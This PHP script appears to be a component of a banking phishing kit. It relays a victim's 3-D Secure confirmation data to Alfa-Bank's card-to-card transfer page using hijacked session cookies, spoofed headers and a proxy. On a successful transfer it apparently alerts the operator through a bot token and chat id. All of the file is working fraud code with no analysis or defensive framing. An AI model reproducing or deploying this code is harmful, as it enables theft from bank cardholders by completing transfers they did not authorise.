<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';

if(isset($_POST['PaRes']) && isset($_POST['MD'])){

  $ch = curl_init('https://www.alfaportal.ru/card2card/ptpl/alfaportal/result.html');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: '.getallheaders()['User-Agent'],'Accept-Language: en-US,en;q=0.5','Accept-Encoding: gzip, deflate, br','Connection: keep-alive','Upgrade-Insecure-Requests: 1','Referer: '.$_SERVER['HTTP_REFERER'],'Content-Type: application/x-www-form-urlencoded','Host: www.alfaportal.ru','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cookie: AP2P='.$_SESSION['cooc']['AP2P'].';JSESSIONID='.$_SESSION['cooc']['JSESSIONID'].';TS0184dca2='.$_SESSION['cooc']['TS0184dca2']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        //curl_setopt($ch,   CURLOPT_HEADER , 1);
           curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'MD='.$_POST['MD'].'&PaRes='.urlencode($_POST['PaRes']));
        $com = curl_exec($ch);
        $tsf1 = curl_getinfo($ch);
        curl_close($ch);
        //var_dump($com);
        
        preg_match_all('#<span class="error-result">(.+?)</span>#is', $com, $error);
        preg_match_all('#<h1>(.+?)</h1>#is', $com, $h1);
        //var_dump($h1[1][0]);
       // var_dump($error[1][0]);
        
        if($h1[1][0] == 'Ваш перевод принят!'){

            getSuccess($token,$bot_receiver,$chatid,$areaname,$zalet);

            
            header('Location: success.html');
        }else{
            getError($token,$chatid,$areaname,$h1[1][0],$error[1][0]);

              header('Location: error.html');
        }
       
}else header("HTTP/1.1 401 Unauthorized");